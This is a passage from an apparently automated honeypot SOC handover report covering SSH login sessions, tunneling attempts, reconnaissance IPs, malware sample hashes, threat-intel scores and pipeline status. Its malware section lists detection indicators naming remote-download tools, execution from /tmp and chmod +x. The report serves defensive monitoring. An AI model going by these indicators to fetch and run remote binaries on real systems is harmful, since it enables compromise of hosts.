| `2026-08-23 06:54:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:54:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:54:30` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a56416694c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:54 |
| **Last Seen** | 2026-08-23 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:54:33` | `cowrie.session.connect` |
| `2026-08-23 06:54:33` | `cowrie.client.version` |
| `2026-08-23 06:54:33` | `cowrie.client.kex` |
| `2026-08-23 06:54:34` | `cowrie.login.success` |
| `2026-08-23 06:54:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:54:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:54:34` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.76.194[.]102` | **30** | 2026-08-23 05:47 | 2026-08-23 05:47 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.77.236[.]250` | **30** | 2026-08-23 06:26 | 2026-08-23 06:27 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.22.130[.]192` | **9** | 2026-08-23 06:42 | 2026-08-23 06:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-23 05:13 | 2026-08-23 06:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.55.110[.]59` | **4** | 2026-08-23 06:42 | 2026-08-23 06:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | **2** | 2026-08-23 06:45 | 2026-08-23 06:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]78` | **2** | 2026-08-23 05:27 | 2026-08-23 06:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `76.125.138[.]115` | **2** | 2026-08-23 05:04 | 2026-08-23 05:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-08-23 05:03 | 2026-08-23 05:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.56.11[.]51` | 1 | 2026-08-23 05:00 | 2026-08-23 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]239` | 1 | 2026-08-23 06:45 | 2026-08-23 06:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.204.245[.]251` | 1 | 2026-08-23 06:52 | 2026-08-23 06:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-08-23 05:47 | 2026-08-23 05:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `189.147.68[.]191` | 1 | 2026-08-23 06:03 | 2026-08-23 06:04 | 12s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]12` | 1 | 2026-08-23 05:52 | 2026-08-23 05:52 | 4s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]106` | 1 | 2026-08-23 04:56 | 2026-08-23 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.106.222[.]119` | 1 | 2026-08-23 06:36 | 2026-08-23 06:36 | 10s | 0 | `T1592` | 🟢 LOW |
| `207.175.205[.]217` | 1 | 2026-08-23 06:39 | 2026-08-23 06:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `223.96.241[.]171` | 1 | 2026-08-23 05:43 | 2026-08-23 05:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-23 06:38 | 2026-08-23 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-23 06:38 | 2026-08-23 06:38 | 3s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]13` | 1 | 2026-08-23 05:15 | 2026-08-23 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-08-23 05:11 | 2026-08-23 05:12 | 66s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-08-23 06:02 | 2026-08-23 06:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]123` | 1 | 2026-08-23 06:24 | 2026-08-23 06:24 | 9s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]74` | 1 | 2026-08-23 04:56 | 2026-08-23 04:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]88` | 1 | 2026-08-23 05:54 | 2026-08-23 05:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]144` | 1 | 2026-08-23 05:28 | 2026-08-23 05:28 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `69.124.69[.]20` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 1 |
| `181.119.64[.]79` | CO | UFINET COLOMBIA, S. A. | **100** ⚠️ | 5 |
| `202.88.236[.]38` | IN | Asianet is a ISP providing access through Cable. | **100** ⚠️ | 3 |
| `85.239.149[.]72` | DE | DEDIK SERVICES LIMITED | **100** ⚠️ | 16 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `43.173.98[.]142` | US | ACEVILLE PTE.LTD. | **100** ⚠️ | 1 |
| `76.125.138[.]115` | US | Comcast Cable Communications, Inc. | **100** ⚠️ | 1 |
| `176.204.245[.]251` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 1 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `47.247.73[.]99` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 98 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 84 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 3 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 207 cases |
| Tool 34  | Credential Extractor        | ✅ 97 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (9.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 65 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 84 priority case(s) shown individually · 28 recon entry/entries in table (8 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T08:35:25Z_
